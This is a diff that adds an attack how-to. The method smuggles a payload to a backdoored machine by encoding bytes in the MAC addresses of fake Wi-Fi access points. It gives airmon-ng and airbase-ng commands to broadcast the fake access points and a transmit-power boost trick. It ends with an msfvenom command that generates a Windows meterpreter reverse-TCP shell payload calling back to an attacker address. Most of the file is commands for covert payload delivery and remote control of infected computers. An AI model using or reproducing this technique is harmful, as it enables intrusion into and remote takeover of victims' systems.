@@ -1,0 +1,75 @@
+STEP 1
+-------
+
+	
+Attacker system make on FAke AP with name "FAKE" and
+Mac-Address is 00:fe:c8:b0:00:11
+
+note: Mac-Address 00:fe:c8:b0:00:11 is our Injected
+Payload so our payload is "fec8b00011"
+
+this section of payload "fec8b00011ddc00945f1"
+
+STEP 2
+--------
+
+backdoor system Scanning Essid "fake" and dumping BSSID
+for that.
+
+note: your backdoor code should dump these section of BSSID
+or Mac-Address fe:c8:b0:00:11 ==> fec8b00011
+
+STEP 3
+---------
+
+attacker system make one Fake AP with Name "Fake" and
+Mac-Address 00:dd:c0:09:45:f1
+
+; note : Mac-Address 00:dd:c0:09:45:f1 is our Injected Payload
+so our payload is "ddc00945f1"
+
+* This section of payload "fec8b00011ddc00945f1"
+
+STEP 4
+----------
+
+Backdoor system Scanning Essid "Fake" and dumping BSSID for
+that
+
+; note : your backdoor code should dump these section of BSSID
+or Mac-ADdress dd:c0:09:45:f1 ==> ddc00945f1
+
+after these 2 step for scanning you will have this payload
+"fec8b00011ddc00945f1 in infected system ( backdoor system )
+
+
+Optional Commands
+-----------------------------
+
+-------------------------
+ifconfig wlan0 down
+iw reg set BO
+ifconfig wlan0 up
+iwconfig wlan0 txpower 30
+--------------------------
+
+1-)airmon-ng start wlan0
+2-)airbase-ng -a 00:fe:c8:b0:00:11 –essid “Fake” -I 10 -0 wlan0mon
+3-)sleep 15
+4-)killall airbase-ng
+5-)airbase-ng -a 00:dd:c0:09:45:f1 –essid “Fake” -I 10 -0 wlan0mon
+6-)sleep 15
+7-)killall airbase-ng
+   BSSID Injection Loop: changing BSSID ( 102 + 2 ) = 104 Times.
+   ----- QUICK INFO -----------------------
+   BSSID Flag for Start = 00:ff:ff:ff:ff:ff
+   BSSID Flag for Finish= 00:ff:00:ff:00:ff
+   ----------------------------------------
+
+After Injection;
+	1-)msfvenom -a x86_64  --platform windows -p windows/x64/meterpreter/reverse_tcp 
+	  lhost=192.168.1.50 -f c > payload.txt
+	2-) in this step you should replace your payload from this format
+	    “\xfc\x48\x83\xe4” to “fc4883e4” in payload.txt file.
+
+
